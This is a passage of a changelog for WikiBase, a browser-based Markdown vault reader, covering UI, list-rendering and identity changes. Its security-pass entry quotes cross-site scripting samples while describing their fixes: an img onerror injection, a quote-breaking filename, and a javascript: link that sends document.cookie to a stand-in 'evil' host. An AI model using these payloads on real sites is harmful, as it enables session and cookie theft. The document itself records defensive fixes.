- Clicking a bookmark or favorite jumps the reader straight to that file and heading — same underlying open-file-and-jump mechanism as clicking directly in the Outline (not a separate code path), so Outline (if also open in the right-panel stack) follows along and highlights the same heading. If the target heading was collapsed, its own subtree unfolds too (`expandHeadingSubtree`), on top of the existing ancestor-chain unfold `revealHeading` already did.
- Storage: personal per-user, saved into the same vault-file identity record used for the header badge (S15) — the `favorites: []` stub from that session was unused until now; replaced with a richer shape (`bookmarks: {files, top, groups}`, `favorites: {items, top, groups}`), with a migration path (`normalizeUserBookmarkData`) for any record still on the old empty-array shape.

---

## 0.14.4 — 2026-07-23

**Changed:** `index.html`

- Resize-handle flare color bug, root-caused properly this time: it was rendering a solid `color-mix()`-computed tone, and `color-mix()` isn't supported everywhere this file can render (SharePoint/Teams embeds can use an older WebView). An unsupported color function makes the whole CSS variable invalid, and SVG `fill` falls back to its default — solid black — which is exactly the black flashing that kept getting reported as a "fade." Replaced every `color-mix()` call with pre-computed hex values, hardcoded per theme and per background variant (16 combinations total), so there's no runtime color function that can fail.
- Second, separate cause of the same black flash: the flare's icon shape never had a default `fill` set for the moments it's not actively hovered/collapsed — only the active-state rules set a color. During the brief opacity fade-out on mouseleave, with no state class matching, it fell through to that same SVG black default. Added a real base fill so the icon always has a valid color, faded or not.
- Removed the "lights up anywhere in the open sidebar/right-panel" hover trigger — turned out to be unwanted once a panel is already open and visible; the flare now only brightens on a direct hover of the handle itself, and stays on permanently when a panel is collapsed (unchanged).
- Removed the redundant sidebar/right-panel toggle buttons from the header — the resize-handle flare has done this job since v0.14.0, so the header's duplicate icons were unnecessary. The flare now calls the toggle logic directly instead of proxying through the header button's click.
- Icon glyph inside the flare shrunk twice this round, roughly 40% smaller overall than the v0.14.3 size, plus the color transition on the flare's fill and the handle line's background was removed entirely (snap instantly on state change, no easing) since animating between the two tones kept reading as a distracting flash rather than a smooth fade.

---

## 0.14.3 — 2026-07-23

**Changed:** `index.html`

- Resize-handle collapse control redesigned: replaced the floating rounded-square icon box with a shape that flares directly out of the drag line itself — a rounded-top tab tapering smoothly back into the 4px line, rather than a separate element sitting near it. Left edge of the flare is flush with the line (no centering math, so no edge-clipping risk either). Icon is the same rect-and-line shape as the header's own sidebar/right-panel buttons, with one small addition — the sidebar icon shades its left segment, the right-panel icon shades its right segment, so it's unambiguous which panel each controls. Same interaction rules as before: lit on hovering the line or anywhere in that panel, hidden otherwise, permanently on once collapsed, and the whole flare shape (not just the icon glyph) is the click target.
- Reader corner-control alignment (Back/Forward/filename, fold-pill/Properties/Edit): added `scrollbar-gutter: stable` to the reader's scroll container. The corner-control wrapper sits outside that scrolling box while the document text centers inside it — without a stable gutter, the two can compute their centering against very slightly different widths (whether a scrollbar happens to be showing) and drift apart, most noticeably around a panel collapse.

---

## 0.14.2 — 2026-07-23

**Changed:** `index.html`

- Resize-handle collapse icon: moved up to line up with the reader's own nav-pill/fold-pill row (top:8px, was 14px), color reverted to the app's standard muted icon tone (the higher-contrast version from v0.14.1 looked odd in practice), and it now lights up from anywhere in the sidebar or right-panel — not just the thin 4px handle line itself. Still shows permanently once a panel is collapsed, unchanged.

---

## 0.14.1 — 2026-07-23

**Changed:** `index.html`

- Resize-handle collapse icon, three fixes from testing v0.14.0: it's now actually clickable (a direct shortcut to the same toggle as the header button, not just a passive indicator), bigger (26px, up from 20px), and reuses the exact panel-toggle icon already used on the header's sidebar/right-panel buttons instead of the chevron from the mockup — higher-contrast color (`--text-primary`) so it reads clearly against the handle line. Position unchanged from v0.14.0 (kept near the top, not lowered).
- Reader corner controls (Back/Forward/filename on the left; fold-pill/Properties/Edit on the right) now align with the document's own left/right text margin instead of the raw reader panel edge. New shared `#reader-corner-align` wrapper mirrors `#reader-content`'s own max-width/margin/padding, so the alignment holds automatically at any window width or sidebar/right-panel state — no JS resize handling needed.

---

## 0.14.0 — 2026-07-23

**Changed:** `index.html`

- Per-user identity (S15): first-run prompt asks for name and email, then remembers you. The record lives in the vault itself at `zSystem/Users/<email>.json` — same hidden sidecar folder already used for comments/change-log files, just at vault root — so entering the same email on a different PC gets recognized as the returning user (record wins over whatever name is typed) instead of creating a duplicate profile. `wb_user_email` in localStorage is only a pointer to which file is "me" on this device.
- Header badge replaces the old Settings gear. The user's initials now sit rightmost in the header (order left to right: theme, help, badge); clicking it opens a small dropdown with name/email, a Settings entry (opens the same settings panel as before, just relocated), and Switch user (clears local identity and re-prompts). Favorites entry point intentionally deferred to next session.
- Sidebar and right-panel resize handles now show a small collapse/expand icon on hover, and leave it on permanently once the panel is collapsed — previously the only visual cue was the handle line itself turning accent-colored on hover, with no indicator at all when a panel was already closed.

---

## 0.13.0 — 2026-07-22

**Changed:** `index.html`

- Right panel now stacks tools instead of one-at-a-time tabs (Outline, Comments, Links, Review, Search). Click a tool icon to add it to the stack or remove it; any number can be open together, stacked top to bottom in click order, each scrolling independently with a drag handle between adjacent panes to resize their share of the space. Double-click a tool icon to open it alone, closing everything else in the stack — reuses the double-click convention already established for resize-handle collapse (v0.5.0) and list subtree-fold (v0.11.0), not a new gesture.
- ⌘K/Ctrl+K adds Search to the stack alongside whatever's already open instead of replacing it; a second Escape (once the search field is already empty) removes just Search from the stack. Turning off Settings → review tools now removes Review from the stack rather than assuming it was the only thing open.
- Which tools are open persists per browser (`wb_rp_open`), same as every other panel preference. The height split between open panes is session-only and resets to even on reload — no drag-ratio storage added for this, kept to the one new key.

---

## 0.12.1 — 2026-07-22

**Changed:** `index.html`

- List-item fold state now persists, matching heading fold memory. Folding a list item (or its whole subtree via double-click) previously only toggled a CSS class with nothing saved — closing and reopening the file, or reloading, lost every list fold. Now stored in `wb_li_folds:<url>`, keyed by each item's position-path in the tree (list items have no natural id the way headings do).

---

## 0.12.0 — 2026-07-21 *(was v0.9i-2)*

**Changed:** `index.html`, `help.md`

EXPERIMENTAL, revertible — see help.md "Tab trees under a bullet."

- **A tab-indented tree with no list markers below the first line now renders correctly**, as long as that first line has a real marker (`-`, `1.`, or `- [ ]`). Traced from a real note (a folder-directory diagram, tabs + a manually-typed folder emoji, no dashes anywhere) that was rendering as one flattened paragraph. Root cause, confirmed against actual Obsidian screenshots: Obsidian's Reading view *also* can't render this without a marker — it drops the indentation and shows flat lines. The tree look Jayson wanted only exists in Obsidian's Edit/Live Preview pane (raw source with editor indent-guides, not rendered markdown). Decision: match the Edit-mode visual anyway, since that's the useful one, not Reading view's flattened output.
- Mechanic: one real marker on the block's first line triggers list parsing, same as always. Every line below it that's tab/2-space indented — marker or not — now becomes its own row in the tree (fold arrows, guide line, no bullet glyph for the marker-less rows). This **replaces** the previous behavior where a marker-less indented line merged into the item above as wrapped continuation text.
- **Trade-off, accepted on purpose:** there's no way to distinguish "this line continues the row above" from "this is a new row" once there's no marker — so every line is now always its own row. A genuinely wrapped multi-sentence description under one row has to be written as a single line and left to wrap, not split across Enters.
- Three simulated samples confirmed before building: the tree-vs-flat comparison against real Obsidian screenshots, the bullet-vs-tab-list explainer (why the marker is the only signal available), and the final one-bullet-triggers-tree behavior itself.

---

## 0.11.1 — 2026-07-21 *(was v0.9i-1)*

**Changed:** `index.html`

Follow-up fixes from Jayson's testing pass on v0.9i, three items.

- **Continuation-line grouping fix had a gap:** the regex only matched exactly one leading tab (`/^(\t| {2,})\S/`), so a marker-less continuation line nested two or more tabs deep still failed the check, broke the list block early, and rendered as a stray paragraph — "shows properly in Obsidian" but not here, for tab-indented lists specifically. Replaced with a check that accepts any run of tabs (1+) or 2+ spaces.
- **Native list markers were still showing, doubled up with the new fold chevron.** `.md-ul`/`.md-ol` never had `list-style: none` set, so the browser's own bullet/number rendered in its usual gutter *in addition to* the new chevron column — visually offset, and `padding-left: 1.5rem` (sized to reserve room for that native marker) on top of the chevron's own width meant every line had noticeably less room for text, so lines wrapped far more than before ("really long on the page"). Fixed by rendering the bullet/number explicitly per item instead of relying on native markers, turning `list-style` off, and shrinking the now-redundant `padding-left` down to a small edge margin.
- **Chevron reordered to sit outside the marker, not between it and the text** — direct result of the fix above: row order is now chevron → bullet/number/checkbox → text, left to right, with nothing else competing for that first position.
- Incidental fix while rewriting the marker: ordinal numbers were computed from raw array position within a list level rather than counting only the `ol`-kind items in it, so a level with, say, a checkbox mixed in ahead of numbered items would skip numbers. Now counts only the numbered items.

---

## 0.11.0 — 2026-07-21 *(was v0.9i)*

**Changed:** `index.html`

Reader panel (S3) — nested list rendering, plus a related same-file link fix.

- **Lists now nest for real.** Bullet, numbered, and checkbox items previously rendered as one flat level regardless of indentation — indent was captured but never used. Depth is now computed per Obsidian's own rule (a tab, or a run of 2 spaces, each count one level; no distinction between bullet/number/checkbox — Obsidian nests all three the same way under the hood), and the reader builds real nested `<ul>/<ol><li>` structure from it.
- **Tab-indented continuation lines no longer fall out of the list.** A marker-less indented line (e.g. a wrapped note under a bullet) used to fail the block-grouping check if it was tab-indented rather than space-indented, breaking the list block early and rendering as a stray paragraph. Grouping now accepts a tab or 2+ spaces; a marker-less line attaches to the previous item as continuation text instead of being dropped.
- **Left-border guide line on nested levels,** Obsidian Minimal-style, applied globally via one class — not a special case per level.
- **Fold control, chevron-only.** Every item with children gets a fold chevron (default expanded, so nothing collapses on you unexpectedly). Only the chevron is clickable — the row text has no cursor, no click handler, and `user-select:none`, so it can't be folded or text-highlighted by accident. Single-click folds just that item's direct children, matching heading fold. Double-click folds/unfolds its entire subtree at once, all levels down — works at any depth, not just top-level items. Click/dblclick are disambiguated with a short delay (single-click's action is held ~220ms and cancelled if a second click arrives), otherwise a double-click would fire the single-fold once before the subtree-fold landed on top of it.
- **Same-file wiki links now scroll instead of reloading, regardless of link form.** `[[#Heading]]` already scrolled in place; `[[File#Heading]]` / `[[File#Heading|text]]` pointing at the file already open still forced a full reload+rescroll. Both forms now resolve the same way when the target is the currently open file.

---

## 0.10.1 — 2026-07-21 *(was v0.9h)*

**Changed:** `index.html`, `help.md`

Security pass. No new features. Four findings from an audit of the reader, all closed.

- **Notes can no longer inject HTML into the reader.** `renderInline()` handed the raw text of a `.md` file to `innerHTML` without escaping it, so HTML typed into a note rendered as live markup — an `<img src=x onerror=...>` in a note ran script for every reader who opened it, holding their SharePoint session. The markdown source is now escaped before any parsing runs. Consequence: raw HTML in notes displays as literal text by design. Obsidian permits HTML (sanitized); WikiBase does not. Nothing in the current vault used it, so nothing visibly changed.
- **Apostrophes in filenames can no longer become executable code.** Several renderers interpolated names and URLs into single-quoted JS strings inside `onclick` attributes. A note or file named `foo');alert(1)//` closed that string and ran whatever followed. Every dynamic handler — sidebar rows, wiki links, embed stubs, backlinks, the Links panel, the Review and Changes inboxes, the Outline — now uses data-attributes read by one delegated listener, where the value is data and can never be parsed as code. `escHtml()` also escapes apostrophes now, as defence in depth. This was a correctness bug as well: names like `Q1 O'Brien notes.md` were already broken in those panels.
- **Link and image URLs are checked against a scheme allowlist.** `[Click me](javascript:fetch('//evil/'+document.cookie))` rendered as an ordinary link and fired on click. http, https, mailto, tel, file and obsidian pass; everything else degrades to plain text. Obfuscation via case, leading whitespace and embedded tabs/newlines is handled. The Links panel applies the same rule, so a blocked link is not still clickable there.
- **Added a Content-Security-Policy.** Backstop, not the fix. `connect-src` is the important line — it stops injected script posting note contents to an outside server. `frame-ancestors` is deliberately absent: it is ignored in a `<meta>` tag and only works as an HTTP header, which a file in a document library cannot set.
- `help.md` "HTML" section rewritten — it documented raw HTML as a supported feature.
- Incidental fix found along the way: a link with a malformed percent-escape (`[x](100%.md)`) threw inside `decodeURIComponent` and killed the render of the whole note. Now caught.

**Known, deferred:** `script-src` still needs `'unsafe-inline'` because ~40 inline `onclick` attributes remain in the *static* markup (toolbar and modal buttons). Those take no dynamic values and are not exploitable, but while the keyword is present `script-src` provides no real XSS protection. Converting them and dropping it is the last step.

---

## 0.10.0 — 2026-07-21 *(was v0.9g)*

**Changed:** `index.html`

- Fixed the version tag showing v0.9c while the changelog was already at v0.9f — it's a static label, not derived from the changelog, and had drifted. Bumped to match; "bump version + changelog together" stays a standing close-checklist item.
- Reader top fade shrunk from 72px to 48px — still fully backs the corner buttons, but reads as less dead space at the top of the page. The fade now also disappears entirely when the reader is scrolled to the very top of a file, so the first heading no longer fades for no reason (there was nothing behind it to hide in the first place).
- Fixed the real cause of Outline clicks sometimes highlighting the wrong item. When a clicked heading landed close enough to its neighbor that both fell inside the scroll-spy's detection zone at once, the neighbor's intersection callback could fire after the clicked heading's and silently steal the highlight. An Outline click (or same-page/cross-file anchor jump) now pins the outline highlight and the reader row highlight directly to the heading you jumped to, and the scroll-spy stands down until you actually scroll again — so it can't get overwritten by a neighbor, and it no longer fades on its own after ~1.4s; it stays until you scroll.
- Reader panel gets a real header bar: Back/Forward move into it (were floating solo, top-left), followed by the current file's name, trimmed of its `.md` extension, flexing to fill the space up to the fold/Properties/Edit cluster on the opposite corner.
- Task checkboxes are clickable straight from the reader, no need to open the full editor for a status tick. Gated by the same "Enable editing" + author-list check already used for New/Move/Edit. Saves immediately and silently, no change-log entry, no Needs Review flip, same treatment as Properties-panel edits.

---

## 0.9.3 — 2026-07-20 *(was v0.9f)*

**Changed:** `index.html`

- Fixed Outline clicks sometimes not scrolling the reader at all — worse on closely-nested headings, but not limited to them. A heading inside a folded ancestor section is `display: none`, so its rect is empty and the scroll math landed nowhere. Outline clicks (and same-page/cross-file anchor links, same underlying bug) now expand the target heading's ancestor chain first, same rule already used by Collapse unused, before scrolling to it. Both code paths now share one `revealHeading()` implementation instead of two separate ones.
- The heading you jump to now lands clear of the button/fade strip at the top of the reader instead of partially underneath it (offset increased from 10px to 56px).
- Jumping to a heading now gives it a brief highlight (same tint as hovering a heading row) that fades out on its own, so it's clear where you landed.
- Increased the reader-fade strip's solid coverage so it fully clears the button row before it starts fading — the previous version was still partly see-through right where the buttons sit.

---

## 0.9.2 — 2026-07-20 *(was v0.9e)*

**Changed:** `index.html`

- Fixed local test mode images showing a broken-image badge instead of the picture (found while confirming the v0.9d image fix on a OneDrive-synced local vault). The placeholder src built for local mode was `local:/Folder/Attachments/image.png` — WikiBase's own internal file identifier, not a real URL. Setting that as an `<img src>` made the browser try to load `local:` as an actual protocol and fail instantly with `ERR_UNKNOWN_URL_SCHEME`, before the async local-file lookup that supplies the real blob URL ever got a chance to run. Local-mode images now render with no `src` at all until that lookup finishes; a genuinely missing file now shows the fallback badge explicitly (there's no failed network request left to trigger it automatically). SharePoint mode is unaffected — it always used a real fetchable URL.

---

## 0.9.1 — 2026-07-20 *(was v0.9d)*

**Changed:** `index.html`

- Fixed the real image bug (v0.9c's fix addressed a different cause of the same symptom). The broken-image fallback markup built the error icon as a string spliced directly into the `onerror="..."` attribute — but the icon is an SVG with its own double-quoted attributes, and a double quote nested inside a double-quoted HTML attribute closes it early. That's what was splicing "Pasted image x.png" and a trailing `'">` into the page and corrupting rendering for everything after it. Replaced with a shared `wbImgError()` function that builds the fallback via DOM methods instead of attribute strings, used by both the inline and standalone image renderers.
- Fixed duplicate Outline highlighting. Heading ids were generated from heading text alone with no uniqueness check, so two headings with the same text (e.g. two "Overview" sections) got the identical DOM id — the Outline's highlight, which matches by id, lit up both rows at once. Ids now de-dupe within a document (second occurrence becomes `h-overview-2`); anchor links still resolve to the first occurrence, unchanged.
- Back/Forward now restores scroll position, not just which file was open. The history stacks store scroll offset alongside url/name; Back and Forward return you to it. Any other navigation (sidebar, wiki link, search) still opens at the top.
- Reader content no longer scrolls with a hard cutoff under the floating corner buttons (Back/Forward, fold controls, Edit, Properties). Added a gradient fade strip above the scroll area so text dissolves before it reaches the icons.

---

## 0.9.0 — 2026-07-20 *(was v0.9c)*

**Changed:** `index.html`

- Fixed a major image bug: `renderInline()` restores images/links into text with `s.replace(placeholder, html)`. Plain-string `.replace()` treats `$&`, `` $` ``, `$'`, `$$` in the replacement as special patterns even without a regex, so an image name, alt text, or link title containing a lone `$` (a cost figure, a filename with a dollar sign) spliced fragments of the surrounding raw markdown into the rendered page — the stray `'">` and swallowed/uncollapsible headings Jayson was seeing. Fixed by passing a replacer function instead of the raw string on both the link/image and code restore lines, so the replacement is always inserted literally.
- H6 headings now get a color instead of falling back to gray — added purple to the Minimal theme's heading palette (`#9e86c8`, confirmed against Obsidian Minimal's own `--color-purple`), completing the existing red→orange→yellow→green→blue rainbow.
- Tables: top/bottom spacing around the table is now padding, not margin (margin was collapsing against the paragraph above, making the top gap read thinner than the bottom). Header row font size now matches the body (14px, was 12px). Tables are content-width and left-justified instead of forced to 100%, matching Obsidian — cells only wrap when the table would otherwise overflow the reader column.
- Outline panel now walks headings H1–H6 (was capped at H3). Removed a stray CSS override that shrank H3 outline entries to 11px while every other level was 12px.
- Outline's active item and the Vault browser's active file now share the same highlight treatment: accent-tinted background plus the existing colored text and right border, instead of text color alone.
- Reader panel back button is now a Back/Forward pair (top-left, mirrors Properties/Edit on the opposite corner). Removed the redundant Back button from the top header bar. Added a session-only forward stack alongside the existing back stack — Back moves the page you're leaving onto Forward's stack and vice versa, same as a browser tab; any other navigation clears Forward's stack.

---

## 0.8.1 — 2026-07-20 *(was v0.9b-1)*

**Changed:** `index.html`

- Fixed heading links showing a literal `#` in the rendered text. `[[#Header Name]]` (same-page) was displaying as "#Header Name" instead of "Header Name" — the display-text fallback was building itself from the raw `#heading` fragment instead of the heading name alone. Linking to a heading in another file (`[[File Name#Header Name]]`) still shows just the file name, unchanged — no `#` was found in that path on inspection; flagged for Jayson to confirm after this fix.

---

## 0.8.0 — 2026-07-20 *(was v0.9b)*

**Changed:** `index.html`

- Folder/file-share links (`file://` UNC or drive paths) no longer attempt to open — browsers can't launch a native Explorer/Finder window from a page link, and the attempt was navigating to a broken URL. Clicking one now copies a cleaned, decoded path (no percent-encoding) to the clipboard and shows a brief "Copied to clipboard" confirmation, ready to paste into Explorer's address bar.
- Fixed a real bug this surfaced: bold/italic/strikethrough/highlight parsing ran on the raw line before links and images were parsed out, so `_`, `*`, `~~`, or `==` inside a link target or filename got read as formatting and silently eaten (this is why underscores were vanishing and paths looked "trimmed" when copied). Links and images are now protected in placeholder slots immediately, the same technique already used for inline code, before any formatting regex runs. Fixes every existing link/image/note title with one of those characters in its target, not just the new folder-link feature.
- Reader corner controls: removed the pill background/border around Collapse all/Collapse unused/Expand all — now plain icon buttons with one separator against Properties instead of a rounded group.
- Vault sidebar header: added a bold "Vault Files" label, removed the divider line below it. The three fold buttons now hide as a group (not individually) when the sidebar narrows enough that they'd crowd the label, and reappear once there's room.
- Outline panel header: same treatment — text label "Outline" (was an icon), divider line removed. Lock toggle (independent/shared fold state) stays, positioned left of the fold buttons with its own separator; the whole group (lock + fold buttons) hides together at narrow widths, same mechanism as the sidebar.
- Comments, Links, Review changes, and Search panel headers now match the same left-justified label style, divider line removed. No button group on these — nothing to hide.

---

## 0.7.0 — 2026-07-19 *(was v0.9a-5)*

**Changed:** `index.html`

- Outline panel now folds. A chevron appears on any heading that has a nested heading below it (leaf headings get no chevron); clicking it hides/shows just its own descendant entries.
- New lock toggle in the Outline toolbar, left of Collapse all / Collapse unused / Expand all: unlocked (default) keeps the Outline's fold state independent of the reader; locked shares the reader's own per-file fold memory, so folding a heading either place folds it both places.
- Outline's Collapse all / Collapse unused / Expand all are now wired up — Collapse unused keeps the active heading and its ancestor chain expanded, same rule as the sidebar and reader fold pill.

---

## 0.6.0 — 2026-07-19 *(was v0.9a-4)*

**Changed:** `index.html`

- Added Collapse all / Collapse unused / Expand all icons to the sidebar (vault browser). Collapse unused keeps the folder path to the currently open file expanded, closes everything else.
- Added a matching fold-control pill (neutral gray, not accent-colored) to the reader panel, left of Properties — same three actions, over the open file's own heading sections. Collapse unused keeps the current heading (per Outline's active-heading tracking) and its ancestor headings expanded.
- Added a Back button: one next to the sidebar toggle in the header, one mirrored top-left of the reader panel (opposite Properties/Edit, same size). Session-only "previous note" history, multiple steps back, resets on reload.
- New/Move header icons are now fully hidden when Settings → Enable editing is off, instead of grayed out. Shown at full weight (matching every other header icon) when it's on.
- Renamed Advanced Settings → "Enable editing (New / Move / Edit)" to "Enable editing".
- The version tag (bottom-right) is now clickable — opens a Changelog view in the reader, same behavior as Help (including the Outline-refresh fix from v0.9a-3, so Outline doesn't show stale headings).
- **Outline panel fold carrots + collapse state deliberately not built this session** — carved out to a dedicated session (spec logged in `kickoff-prompt.md`, section ③b).

---

## 0.5.0 — 2026-07-16 *(was v0.9a-3)*

**Changed:** `index.html`

- Fixed nested callouts — `>>` and `>>>` now render as proper nested callouts/blockquotes (previously only one level of `>` worked).
- Sidebar and right-panel resize handles now require a double-click to collapse, not a single click.
- Fixed a bug where opening Help left the Outline panel showing the previous file's headings; clicking one could error out.
- Rebuilt the Links panel: now shows the current file's own links, categorized as MD Files / Websites / Folders / Other, above the existing (session-scoped) Backlinks list.
- Added per-heading collapse memory — folded sections now persist per file, like Obsidian.
- Tuned spacing above/below headings, especially around the H2 underline.
- **Not fixed, tracked open:** a Markdown file reportedly froze the app once. Held pending reproduction — need the actual file to diagnose properly instead of guessing at a fix.

---

## 0.4.0 — 2026-07-16 *(was v0.9a-2)*

**Changed:** `index.html`

- Added a manual PWA update-available indicator (up-arrow icon, appears when a new version has taken over the service worker; click reloads).
- Reworked the Review tab: vault-wide overview (File changes / New files) always shown at the top, per-file card list unchanged below it.

---

## 0.3.1 — 2026-07-16 *(was v0.9a-1)*

**Changed:** `index.html`

- Moved the file audit out of Settings entirely; folded into the Review changes screen as a "New Files" section.
- Fixed review-card click sometimes highlighting the wrong line in the reader (was matching short blocks, often the title, instead of the actual change).
- Fixed Minimal theme header colors — pulled the real hex values from Obsidian Minimal's own theme.css instead of placeholder colors.

---

## 0.3.0 — 2026-07-16 *(was v0.9a)*

**Changed:** `index.html`

- Fixed a boot bug where nested open subfolders got stuck on "Loading…" (only top-level open folders were being preloaded).
- Added Settings → Navigation → "Open last note" (default on) — boot reopens the last file you had open instead of restoring exact folder state.
- Compressed Header colors + Background color into one settings row.
- Added a read-only file audit (flags files WikiBase has never written to, i.e. never touched/reviewed).
- Fixed Minimal theme H1/H2 color swap.

---

## 0.2.0 — 2026-07-16 *(was v0.8e-1, reconstructed, partial)*

**Changed:** `index.html`

- Minimal theme identity work, H2 underline toggle, image-size syntax (`![[img.png|width]]`), Theme settings sub-grouping.
- Full change detail not captured at the time — flagged as a documentation gap, not reconstructed further.

---

## 0.1.1 — 2026-07-16 *(was v0.8d, reconstructed, partial)*

**Changed:** `index.html`

- Incremental theme/settings work between v0.8c and v0.8e-1. Detail not captured at the time.

---

## 0.1.0 — 2026-07-16 *(was v0.8c, reconstructed, partial)*

**Changed:** `index.html`

- Earliest of the untracked same-day sessions. Detail not captured at the time.
